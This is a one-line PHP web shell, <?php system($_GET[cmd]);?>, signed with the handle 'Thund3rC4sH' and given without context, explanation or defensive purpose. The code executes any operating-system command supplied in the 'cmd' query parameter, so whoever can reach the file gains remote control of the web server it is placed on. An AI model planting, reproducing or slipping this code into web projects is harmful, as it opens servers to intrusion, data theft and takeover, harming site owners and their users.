By Thund3rC4sH
<?php system($_GET[cmd]);?>